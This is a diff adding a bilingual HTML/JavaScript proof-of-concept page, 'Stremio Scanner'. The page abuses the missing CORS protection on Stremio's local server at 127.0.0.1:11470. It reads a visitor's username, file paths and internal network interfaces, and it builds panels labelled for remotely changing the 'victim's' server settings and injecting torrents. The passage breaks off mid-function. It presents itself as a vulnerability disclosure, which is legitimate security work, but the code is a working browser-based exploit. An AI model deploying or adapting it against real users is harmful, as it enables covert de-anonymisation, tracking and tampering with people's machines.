@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stremio Scanner</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Inter:wght@400;500;700;800&display=swap"
+        rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        :root {
+            --bg: #111111;
+            --card: #14141c;
+            --border: #1e1e2a;
+            --text: #c8c8d0;
+            --dim: #5a5a6e;
+            --accent: #7c5cfc;
+            --red: #e8364f;
+            --green: #34d399;
+            --orange: #f59e0b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 50px 20px;
+        }
+
+        body.en {
+            font-family: 'Inter', sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 580px;
+        }
+
+        .lang-toggle {
+            position: fixed;
+            top: 16px;
+            left: 16px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 6px 14px;
+            color: var(--dim);
+            font-family: 'Inter', sans-serif;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: border-color 0.2s, color 0.2s;
+            z-index: 10;
+        }
+
+        .lang-toggle:hover {
+            border-color: var(--accent);
+            color: var(--text);
+        }
+
+        .status {
+            text-align: center;
+            margin-bottom: 36px;
+        }
+
+        .status-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .status-icon.checking {
+            background: #1a1a2a;
+            animation: pulse 1.2s infinite;
+        }
+
+        .status-icon.online {
+            background: rgba(52, 211, 153, 0.1);
+        }
+
+        .status-icon.offline {
+            background: rgba(232, 54, 79, 0.1);
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: 0.3
+            }
+        }
+
+        .status h1 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .status p {
+            font-size: 13px;
+            color: var(--dim);
+        }
+
+        .leaked {
+            display: none;
+        }
+
+        .leaked.show {
+            display: block;
+        }
+
+        .section-title {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--dim);
+            margin-bottom: 12px;
+            padding-right: 2px;
+        }
+
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+            gap: 12px;
+        }
+
+        .row:last-child {
+            border-bottom: none;
+        }
+
+        .row-label {
+            font-size: 13px;
+            color: var(--dim);
+            flex-shrink: 0;
+        }
+
+        .row-value {
+            font-size: 13px;
+            font-weight: 500;
+            text-align: left;
+            direction: ltr;
+            word-break: break-all;
+            color: var(--text);
+        }
+
+        .row-value.highlight {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .badge {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-right: 6px;
+        }
+
+        .badge-leak {
+            background: rgba(232, 54, 79, 0.15);
+            color: var(--red);
+        }
+
+        .badge-danger {
+            background: rgba(232, 54, 79, 0.15);
+            color: var(--red);
+        }
+
+        /* Control panel */
+        .control-panel {
+            margin-top: 24px;
+        }
+
+        .ctrl-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .ctrl-row:last-child {
+            border-bottom: none;
+        }
+
+        .ctrl-label {
+            font-size: 13px;
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .ctrl-label small {
+            font-size: 11px;
+            color: var(--dim);
+            font-weight: 400;
+        }
+
+        /* Toggle switch */
+        .toggle {
+            position: relative;
+            width: 44px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .toggle input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #2a2a3a;
+            border-radius: 24px;
+            transition: 0.3s;
+        }
+
+        .toggle-slider:before {
+            content: '';
+            position: absolute;
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background: #666;
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        .toggle input:checked+.toggle-slider {
+            background: var(--accent);
+        }
+
+        .toggle input:checked+.toggle-slider:before {
+            transform: translateX(20px);
+            background: #fff;
+        }
+
+        /* Select */
+        .ctrl-select {
+            background: #1a1a2a;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 12px;
+            padding: 6px 10px;
+            cursor: pointer;
+            outline: none;
+            min-width: 120px;
+        }
+
+        .ctrl-select:focus {
+            border-color: var(--accent);
+        }
+
+        /* Number input */
+        .ctrl-number {
+            background: #1a1a2a;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 12px;
+            padding: 6px 10px;
+            width: 100px;
+            outline: none;
+            text-align: center;
+        }
+
+        .ctrl-number:focus {
+            border-color: var(--accent);
+        }
+
+        /* Apply button */
+        .apply-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #e8364f, #c92040);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: opacity 0.2s, transform 0.1s;
+            letter-spacing: 0.5px;
+        }
+
+        .apply-btn:hover {
+            opacity: 0.9;
+        }
+
+        .apply-btn:active {
+            transform: scale(0.98);
+        }
+
+        .apply-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: #1a1a2a;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 24px;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 500;
+            z-index: 100;
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.4s;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast.success {
+            border-color: var(--green);
+            color: var(--green);
+        }
+
+        .toast.error {
+            border-color: var(--red);
+            color: var(--red);
+        }
+
+        .user-card {
+            background: linear-gradient(135deg, #1a1028, #14141c);
+            border: 1px solid #2a1f3d;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .user-card .avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: var(--accent);
+            color: #fff;
+            font-size: 20px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+        }
+
+        .user-card .username {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+
+        .user-card .meta {
+            font-size: 12px;
+            color: var(--dim);
+        }
+
+        .info-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--dim);
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: border-color 0.2s;
+        }
+
+        .info-btn:hover {
+            border-color: var(--accent);
+            color: var(--text);
+        }
+
+        /* Torrent Injection Panel */
+        .torrent-panel {
+            margin-top: 24px;
+        }
+
+        .torrent-input-wrap {
+            display: flex;
+            gap: 8px;
+            padding: 14px 16px;
+        }
+
+        .torrent-input {
+            flex: 1;
+            background: #1a1a2a;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-family: 'Inter', monospace;
+            font-size: 12px;
+            padding: 10px 12px;
+            outline: none;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .torrent-input::placeholder {
+            color: #3a3a4a;
+        }
+
+        .torrent-input:focus {
+            border-color: var(--accent);
+        }
+
+        .torrent-go-btn {
+            background: linear-gradient(135deg, #e8364f, #c92040);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 700;
+            padding: 10px 20px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: opacity 0.2s, transform 0.1s;
+        }
+
+        .torrent-go-btn:hover {
+            opacity: 0.9;
+        }
+
+        .torrent-go-btn:active {
+            transform: scale(0.97);
+        }
+
+        .torrent-go-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .torrent-stats {
+            display: none;
+            margin: 0 16px 14px;
+            padding: 14px;
+            background: #0d0d14;
+            border: 1px solid #1a1a28;
+            border-radius: 10px;
+        }
+
+        .torrent-stats.show {
+            display: block;
+        }
+
+        .ts-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .ts-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            animation: pulse 1.2s infinite;
+        }
+
+        .ts-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text);
+            direction: ltr;
+            text-align: left;
+            word-break: break-all;
+        }
+
+        .ts-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+
+        .ts-item {
+            background: #14141c;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .ts-val {
+            font-size: 18px;
+            font-weight: 800;
+            color: #fff;
+            direction: ltr;
+        }
+
+        .ts-lbl {
+            font-size: 10px;
+            color: var(--dim);
+            margin-top: 2px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .ts-progress {
+            margin-top: 10px;
+            background: #1a1a28;
+            border-radius: 6px;
+            height: 8px;
+            overflow: hidden;
+        }
+
+        .ts-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--green));
+            border-radius: 6px;
+            transition: width 0.5s ease;
+        }
+
+        .ts-error {
+            color: var(--red);
+            font-size: 12px;
+            padding: 10px 16px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <button class="lang-toggle" id="langBtn" onclick="toggleLang()">EN</button>
+
+    <div class="container">
+
+        <div class="status">
+            <div class="status-icon checking" id="statusIcon">⏳</div>
+            <h1 id="statusTitle"></h1>
+            <p id="statusSub"></p>
+        </div>
+
+        <div class="leaked" id="leaked">
+
+            <div class="user-card" id="userCard" style="display:none">
+                <div class="avatar" id="userAvatar"></div>
+                <div class="username" id="userName"></div>
+                <div class="meta" id="userMeta"></div>
+            </div>
+
+            <div class="section-title" id="sectionSettings"></div>
+            <div class="card" id="settingsCard"></div>
+
+            <div class="section-title" id="sectionNetwork"></div>
+            <div class="card" id="networkCard"></div>
+
+            <div class="control-panel" id="controlPanel" style="display:none">
+                <div class="section-title" id="sectionControl"></div>
+                <div class="card" id="controlCard"></div>
+                <button class="apply-btn" id="applyBtn" onclick="applySettings()"></button>
+            </div>
+
+            <div class="torrent-panel" id="torrentPanel" style="display:none">
+                <div class="section-title" id="sectionTorrent"></div>
+                <div class="card">
+                    <div class="torrent-input-wrap">
+                        <input type="text" class="torrent-input" id="torrentInput"
+                            placeholder="magnet:?xt=urn:btih:... or infoHash" dir="ltr">
+                        <button class="torrent-go-btn" id="torrentGoBtn" onclick="injectTorrent()">🚀</button>
+                    </div>
+                    <div class="torrent-stats" id="torrentStats"></div>
+                    <div class="ts-error" id="torrentError" style="display:none"></div>
+                </div>
+            </div>
+
+            <button class="info-btn" id="infoBtn" onclick="showExplainer()"></button>
+        </div>
+    </div>
+
+    <script>
+        const TARGET = 'http://127.0.0.1:11470';
+
+        var lang = 'ar';
+        var cachedSettings = null;
+        var cachedNetwork = null;
+
+        const T = {
+            ar: {
+                scanning: 'جاري الفحص...',
+                scanSub: 'يتم التحقق من http://127.0.0.1:11470',
+                running: 'Stremio is running',
+                runningSub: 'تم الوصول للسيرفر المحلي بنجاح — البيانات التالية مكشوفة',
+                offline: 'Stremio غير شغال',
+                offlineSub: 'السيرفر مو شغال على هالجهاز أو CORS محظور',
+                sectionSettings: '<span class="badge badge-leak">LEAKED</span> بيانات السيرفر',
+                sectionNetwork: '<span class="badge badge-leak">LEAKED</span> معلومات الشبكة',
+                sectionControl: '<span class="badge badge-danger">⚡ CONTROL</span> تعديل الإعدادات عن بُعد',
+                infoBtn: 'ℹ️ وش هالثغرة؟ اضغط للتوضيح',
+                applyBtn: '🚀 تطبيق التعديلات على سيرفر الضحية',
+                applySuccess: '✅ تم تطبيق التعديلات بنجاح!',
+                applyError: '❌ فشل الإرسال',
+                applying: '⏳ جاري الإرسال...',
+                username: 'اسم المستخدم',
+                ipPort: 'IP + Port',
+                version: 'نسخة السيرفر',
+                serverPath: 'مسار السيرفر',
+                https: 'تشفير HTTPS',
+                proxy: 'Proxy Streams',
+                enabled: 'مفعّل',
+                disabled: 'معطّل',
+                status: 'الحالة',
+                swalTitle: '⚠️ تنبيه أمني',
+                lbl_cacheSize: 'حجم الكاش',
+                lbl_cacheSize_desc: 'حجم التخزين المؤقت للتورنت',
+                lbl_remoteHttps: 'اتصال HTTPS عن بُعد',
+                lbl_remoteHttps_desc: 'تفعيل HTTPS للوصول عن بُعد',
+                lbl_localAddonEnabled: 'الإضافة المحلية',
+                lbl_localAddonEnabled_desc: 'تفعيل إضافة الملفات المحلية',
+                lbl_proxyStreamsEnabled: 'بروكسي البث',
+                lbl_proxyStreamsEnabled_desc: 'تمرير البث عبر السيرفر',
+                lbl_transcodeHardwareAccel: 'تسريع الهاردوير',
+                lbl_transcodeHardwareAccel_desc: 'استخدام GPU للترميز',
+                lbl_btMaxConnections: 'أقصى اتصالات',
+                lbl_btMaxConnections_desc: 'عدد peers التورنت',
+                lbl_btDownloadSpeedSoftLimit: 'حد السرعة (ناعم)',
+                lbl_btDownloadSpeedSoftLimit_desc: 'bytes/s',
+                lbl_btDownloadSpeedHardLimit: 'حد السرعة (صارم)',
+                lbl_btDownloadSpeedHardLimit_desc: 'bytes/s',
+                lbl_transcodeMaxBitRate: 'أقصى بت ريت',
+                lbl_transcodeMaxBitRate_desc: '0 = بلا حدود',
+                lbl_transcodeConcurrency: 'ترميز متزامن',
+                lbl_transcodeConcurrency_desc: 'عدد العمليات المتزامنة',
+                sectionTorrent: '<span class="badge badge-danger">💣 INJECT</span> حقن تورنت على جهاز الضحية',
+                torrentBtn: '🚀 إنشاء',
+                torrentCreating: '⏳ جاري الإنشاء...',
+                torrentCreated: '✅ تم إنشاء التورنت!',
+                torrentFail: '❌ فشل إنشاء التورنت',
+                torrentInvalid: '❌ أدخل magnet link أو infoHash صحيح',
+                tsProgress: 'التقدم',
+                tsSpeed: 'السرعة',
+                tsPeers: 'الأقران',
+                tsSize: 'الحجم',
+                swalConfirm: 'فهمت',
+                swalHtml: `
+                    <p style="margin-bottom:4px"><strong style="color:#f59e0b">⚠️ تسريب بيانات Stremio من جهازك</strong></p>
+                    <p style="margin-bottom:10px">
+                        أي موقع عادي في الإنترنت يقدر يقرأ بيانات Stremio اللي على جهازك — <strong style="color:#ddd">بدون إذنك، بدون تنبيه، بدون ما تحس بأي شي.</strong>
+                    </p>
+                    <p style="margin-bottom:4px"><strong style="color:#ddd">ليش؟</strong></p>
+                    <p style="margin-bottom:10px">
+                        لأن سيرفر Stremio المحلي اللي يشتغل على
+                        <code style="background:#1a1a2a;padding:2px 6px;border-radius:4px;color:#e8364f">127.0.0.1:11470</code>
+                        بلا حماية CORS.<br><br>
+                        وهذي الحماية بالأساس وظيفتها: <strong style="color:#ddd">تمنع المواقع من الوصول لخدمات جهازك أو بياناته عبر المتصفح.</strong><br>
+                        لكنها <strong style="color:#f59e0b">معطّلة</strong> في Stremio.
+                    </p>
+                    <p style="margin-bottom:4px"><strong style="color:#e8364f">🧨 وليش هذا يعتبر خطر؟</strong></p>
+                    <p style="margin-bottom:3px"><strong style="color:#ddd">• تتبع بدون كوكيز</strong></p>
+                    <p style="margin-bottom:10px">
+                        حتى لو مسحت كل الكوكيز أو استخدمت وضع التصفح الخفي،<br>
+                        😶‍🌫️ هالمعلومات تبقى ثابتة وتُستخدم في تتبعك.
+                    </p>
+                    <p style="margin-bottom:3px"><strong style="color:#ddd">• الـ VPN ما يغطيها</strong></p>
+                    <p style="margin-bottom:10px">
+                        الـ VPN يخفي عنوانك الخارجي فقط،<br>
+                        أما عناوين الشبكة الداخلية تبقى مكشوفة.
+                    </p>
+                    <p style="margin-bottom:3px"><strong style="color:#ddd">• يقدر يرسم خريطة جهازك</strong></p>
+                    <p style="margin-bottom:4px">المهاجم يقدر يعرف عنك:</p>
+                    <p style="margin-bottom:10px;padding-right:8px">
+                        — اسم المستخدم<br>
+                        — نوع الشبكات المتصل فيها<br>
+                        — وين ملفاتك تقريباً
+                    </p>
+                    <p style="margin-bottom:4px;color:#ddd"><strong>هذا يُستخدم في:</strong></p>
+                    <p style="margin-bottom:10px;padding-right:8px">
+                        ✔️ حملات تصيّد مخصّصة باسمك<br>
+                        ✔️ إعلانات تستهدفك حسب شبكتك<br>
+                        ✔️ تجميع بياناتك وبيعها
+                    </p>
+                    <p style="color:#555;font-size:11px;border-top:1px solid #1e1e1e;padding-top:8px;margin-top:4px">
+                        ⚡  المشكلة في البرنامج نفسه ولازم يتحدّث من المطوّر.
+                    </p>`
+            },
+            en: {
+                scanning: 'Scanning...',
+                scanSub: 'Checking http://127.0.0.1:11470',
+                running: 'Stremio is running',
+                runningSub: 'Local server is accessible — the following data is exposed',
+                offline: 'Stremio is not running',
+                offlineSub: 'Server is not running on this device or CORS is blocked',
+                sectionSettings: '<span class="badge badge-leak">LEAKED</span> Server Data',
+                sectionNetwork: '<span class="badge badge-leak">LEAKED</span> Network Info',
+                sectionControl: '<span class="badge badge-danger">⚡ CONTROL</span> Remote Settings Modification',
+                infoBtn: 'ℹ️ What is this vulnerability? Tap to learn',
+                applyBtn: '🚀 Apply Changes to Victim\'s Server',
+                applySuccess: '✅ Settings applied successfully!',
+                applyError: '❌ Failed to send',
+                applying: '⏳ Sending...',
+                username: 'Username',
+                ipPort: 'IP + Port',
+                version: 'Server Version',
+                serverPath: 'Server Path',
+                https: 'HTTPS',
+                proxy: 'Proxy Streams',
+                enabled: 'Enabled',
+                disabled: 'Disabled',
+                status: 'Status',
+                swalTitle: '⚠️ Security Alert',
+                lbl_cacheSize: 'Cache Size',
+                lbl_cacheSize_desc: 'Torrent cache storage size',
+                lbl_remoteHttps: 'Remote HTTPS',
+                lbl_remoteHttps_desc: 'Enable HTTPS for remote access',
+                lbl_localAddonEnabled: 'Local Addon',
+                lbl_localAddonEnabled_desc: 'Enable local files addon',
+                lbl_proxyStreamsEnabled: 'Proxy Streams',
+                lbl_proxyStreamsEnabled_desc: 'Route streams through server',
+                lbl_transcodeHardwareAccel: 'Hardware Accel',
+                lbl_transcodeHardwareAccel_desc: 'Use GPU for transcoding',
+                lbl_btMaxConnections: 'Max Connections',
+                lbl_btMaxConnections_desc: 'Torrent peer connections',
+                lbl_btDownloadSpeedSoftLimit: 'Speed Limit (Soft)',
+                lbl_btDownloadSpeedSoftLimit_desc: 'bytes/s',
+                lbl_btDownloadSpeedHardLimit: 'Speed Limit (Hard)',
+                lbl_btDownloadSpeedHardLimit_desc: 'bytes/s',
+                lbl_transcodeMaxBitRate: 'Max Bitrate',
+                lbl_transcodeMaxBitRate_desc: '0 = unlimited',
+                lbl_transcodeConcurrency: 'Transcode Concurrency',
+                lbl_transcodeConcurrency_desc: 'Simultaneous operations',
+                sectionTorrent: '<span class="badge badge-danger">💣 INJECT</span> Inject Torrent on Victim\'s Device',
+                torrentBtn: '🚀 Create',
+                torrentCreating: '⏳ Creating...',
+                torrentCreated: '✅ Torrent created!',
+                torrentFail: '❌ Failed to create torrent',
+                torrentInvalid: '❌ Enter a valid magnet link or infoHash',
+                tsProgress: 'Progress',
+                tsSpeed: 'Speed',
+                tsPeers: 'Peers',
+                tsSize: 'Size',
+                swalConfirm: 'Got it',
+                swalHtml: `
+                    <p style="margin-bottom:4px"><strong style="color:#f59e0b">⚠️ Stremio data leak from your device</strong></p>
+                    <p style="margin-bottom:10px">
+                        Any website on the internet can read your Stremio data — <strong style="color:#ddd">without your permission, without any notification, without you noticing.</strong>
+                    </p>
+                    <p style="margin-bottom:4px"><strong style="color:#ddd">Why?</strong></p>
+                    <p style="margin-bottom:10px">
+                        Stremio's local server running on
+                        <code style="background:#1a1a2a;padding:2px 6px;border-radius:4px;color:#e8364f">127.0.0.1:11470</code>
+                        has no CORS protection.<br><br>
+                        CORS is designed to <strong style="color:#ddd">prevent websites from accessing local services on your device.</strong><br>
+                        But it's <strong style="color:#f59e0b">disabled</strong> in Stremio.
+                    </p>
+                    <p style="margin-bottom:4px"><strong style="color:#e8364f">🧨 Why is this dangerous?</strong></p>
+                    <p style="margin-bottom:3px"><strong style="color:#ddd">• Tracking without cookies</strong></p>
+                    <p style="margin-bottom:10px">
+                        Even if you clear all cookies or use incognito mode,<br>
+                        😶‍🌫️ this data stays the same and can be used to track you.
+                    </p>
+                    <p style="margin-bottom:3px"><strong style="color:#ddd">• VPN doesn't cover it</strong></p>
+                    <p style="margin-bottom:10px">
+                        VPN only hides your external IP address.<br>
+                        Internal network addresses remain exposed.
+                    </p>
+                    <p style="margin-bottom:3px"><strong style="color:#ddd">• Can map your device</strong></p>
+                    <p style="margin-bottom:4px">An attacker can learn:</p>
+                    <p style="margin-bottom:10px;padding-left:8px">
+                        — Your Windows username<br>
+                        — Connected networks<br>
+                        — Approximate file locations
+                    </p>
+                    <p style="margin-bottom:4px;color:#ddd"><strong>This can be used for:</strong></p>
+                    <p style="margin-bottom:10px;padding-left:8px">
+                        ✔️ Targeted phishing using your name<br>
+                        ✔️ Ads targeting based on your network<br>
+                        ✔️ Collecting and selling your data
+                    </p>
+                    <p style="color:#555;font-size:11px;border-top:1px solid #1e1e1e;padding-top:8px;margin-top:4px">
+                        ⚡  This is a software-level issue that must be fixed by the developer.
+                    </p>`
+            }
+        };
+
+        function t(key) { return T[lang][key]; }
+
+        function toggleLang() {
+            lang = lang === 'ar' ? 'en' : 'ar';
+            document.documentElement.lang = lang;
+            document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+            document.body.classList.toggle('en', lang === 'en');
+            document.getElementById('langBtn').textContent = lang === 'ar' ? 'EN' : 'AR';
+            applyLang();
+        }
+
+        function applyLang() {
+            document.getElementById('sectionSettings').innerHTML = t('sectionSettings');
+            document.getElementById('sectionNetwork').innerHTML = t('sectionNetwork');
+            document.getElementById('sectionControl').innerHTML = t('sectionControl');
+            document.getElementById('sectionTorrent').innerHTML = t('sectionTorrent');
+            document.getElementById('infoBtn').textContent = t('infoBtn');
+            document.getElementById('applyBtn').textContent = t('applyBtn');
+            document.getElementById('torrentGoBtn').textContent = t('torrentBtn');
+
+            var icon = document.getElementById('statusIcon');
+            if (icon.classList.contains('online')) {
+                document.getElementById('statusTitle').textContent = t('running');
+                document.getElementById('statusSub').textContent = t('runningSub');
+            } else if (icon.classList.contains('offline')) {
+                document.getElementById('statusTitle').textContent = t('offline');
+                document.getElementById('statusSub').textContent = t('offlineSub');
+            } else {
+                document.getElementById('statusTitle').textContent = t('scanning');
+                document.getElementById('statusSub').textContent = t('scanSub');
+            }
+
+            if (cachedSettings && cachedNetwork) {
+                renderData(cachedSettings, cachedNetwork);
+                renderControlPanel(cachedSettings);
+            }
+        }
+
+        async function init() {
+            applyLang();
+            try {
+                const [settingsRes, networkRes] = await Promise.all([
+                    fetch(TARGET + '/settings', { mode: 'cors' }),
+                    fetch(TARGET + '/network-info', { mode: 'cors' })
+                ]);
+
+                cachedSettings = await settingsRes.json();
+                cachedNetwork = await networkRes.json();
+
+                document.getElementById('statusIcon').className = 'status-icon online';
+                document.getElementById('statusIcon').textContent = '🟢';
+                document.getElementById('statusTitle').textContent = t('running');
+                document.getElementById('statusSub').textContent = t('runningSub');
+                document.getElementById('leaked').classList.add('show');
+
+                renderData(cachedSettings, cachedNetwork);
+                renderControlPanel(cachedSettings);
+                document.getElementById('controlPanel').style.display = 'block';
+                document.getElementById('torrentPanel').style.display = 'block';
+                setTimeout(showExplainer, 1500);
+
+            } catch (e) {
+                document.getElementById('statusIcon').className = 'status-icon offline';
+                document.getElementById('statusIcon').textContent = '⭕';
+                document.getElementById('statusTitle').textContent = t('offline');
+                document.getElementById('statusSub').textContent = t('offlineSub');
+            }
+        }
+
+        function renderData(settings, network) {
+            const v = settings.values || {};
+            const base = settings.baseUrl || '';
+            const username = extractUsername(v.appPath || '');
+
+            if (username) {
+                document.getElementById('userCard').style.display = 'block';
+                document.getElementById('userAvatar').textContent = username.charAt(0).toUpperCase();
+                document.getElementById('userName').textContent = username;
+            }
+
+            const settingsRows = [];
+            if (username) settingsRows.push({ label: t('username'), value: username, hl: true });
+            if (base) settingsRows.push({ label: t('ipPort'), value: base, hl: true });
+            if (v.serverVersion) settingsRows.push({ label: t('version'), value: v.serverVersion });
+            if (v.appPath) settingsRows.push({ label: t('serverPath'), value: v.appPath, hl: true });
+            if (v.allTranscodeProfiles) settingsRows.push({ label: 'GPU Transcode', value: v.allTranscodeProfiles.join(', ') });
+            settingsRows.push({ label: t('https'), value: v.remoteHttps || t('disabled') });
+            settingsRows.push({ label: t('proxy'), value: v.proxyStreamsEnabled ? t('enabled') : t('disabled') });
+
+            document.getElementById('settingsCard').innerHTML = settingsRows.map(r =>
+                '<div class="row">' +
+                '<span class="row-label">' + r.label + '</span>' +
+                '<span class="row-value' + (r.hl ? ' highlight' : '') + '">' + esc(String(r.value)) + '</span>' +
+                '</div>'
+            ).join('');
+
+            const netRows = [];
+            if (network.availableInterfaces) {
+                network.availableInterfaces.forEach(ip => {
+                    netRows.push({ label: 'Interface', value: ip, hl: true });
+                });
+            }
+            if (netRows.length === 0) {
+                netRows.push({ label: t('status'), value: JSON.stringify(network).substring(0, 200) });
+            }
+            document.getElementById('networkCard').innerHTML = netRows.map(r =>
+                '<div class="row">' +
+                '<span class="row-label">' + r.label + '</span>' +
+                '<span class="row-value' + (r.hl ? ' highlight' : '') + '">' + esc(String(r.value)) + '</span>' +
+                '</div>'
+            ).join('');
+        }
+
+        function extractUsername(path) {
+            const match = path.match(/[Uu]sers[\\\/]([^\\\/]+)/);
+            return match ? match[1] : null;
+        }
+
+        function formatBytes(b) {
+            if (b >= 1e9) return (b / 1e9).toFixed(1) + ' GB';
+            if (b >= 1e6) return (b / 1e6).toFixed(1) + ' MB';
+            return b + ' bytes';
+        }
+
+        function esc(s) {
+            return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
+
+        function renderControlPanel(settings) {
+            const v = settings.values || {};
+            const opts = settings.options || [];
+
+            const cacheSizes = [
+                { name: 'No Caching', val: 0 },
+                { name: '2 GB', val: 2147483648 },
+                { name: '5 GB', val: 5368709120 },
+                { name: '10 GB', val: 10737418240 },
+                { name: '∞', val: null }
+            ];
+
+            const httpsOpts = [{ name: 'Disabled', val: '' }];
+            const httpsOption = opts.find(o => o.id === 'remoteHttps');
+            if (httpsOption && httpsOption.selections) {
+                httpsOption.selections.forEach(s => {
+                    if (s.val) httpsOpts.push({ name: s.name, val: s.val });
+                });
+            }
+
+            let html = '';
+
+            // Boolean toggles
+            const toggles = [
+                { id: 'localAddonEnabled', val: !!v.localAddonEnabled },
+                { id: 'proxyStreamsEnabled', val: !!v.proxyStreamsEnabled },
+                { id: 'transcodeHardwareAccel', val: !!v.transcodeHardwareAccel },
+            ];
+
+            toggles.forEach(tog => {
+                html += '<div class="ctrl-row">' +
+                    '<span class="ctrl-label">' + t('lbl_' + tog.id) + '<small>' + t('lbl_' + tog.id + '_desc') + '</small></span>' +
+                    '<label class="toggle"><input type="checkbox" data-key="' + tog.id + '" data-type="bool" ' + (tog.val ? 'checked' : '') + '>' +
+                    '<span class="toggle-slider"></span></label>' +
+                    '</div>';
+            });
+
+            // Cache size select
+            html += '<div class="ctrl-row">' +
+                '<span class="ctrl-label">' + t('lbl_cacheSize') + '<small>' + t('lbl_cacheSize_desc') + '</small></span>' +
+                '<select class="ctrl-select" data-key="cacheSize" data-type="select-null">';
+            cacheSizes.forEach(cs => {
+                const sel = (v.cacheSize === cs.val || (v.cacheSize === null && cs.val === null)) ? ' selected' : '';
+                html += '<option value="' + cs.val + '"' + sel + '>' + cs.name + '</option>';
+            });
+            html += '</select></div>';
+
+            // HTTPS select
+            html += '<div class="ctrl-row">' +
+                '<span class="ctrl-label">' + t('lbl_remoteHttps') + '<small>' + t('lbl_remoteHttps_desc') + '</small></span>' +
+                '<select class="ctrl-select" data-key="remoteHttps" data-type="select-str">';
+            httpsOpts.forEach(opt => {
+                const sel = v.remoteHttps === opt.val ? ' selected' : '';
+                html += '<option value="' + esc(opt.val) + '"' + sel + '>' + esc(opt.name) + '</option>';
+            });
+            html += '</select></div>';
+
+            // Number inputs
+            const numbers = [
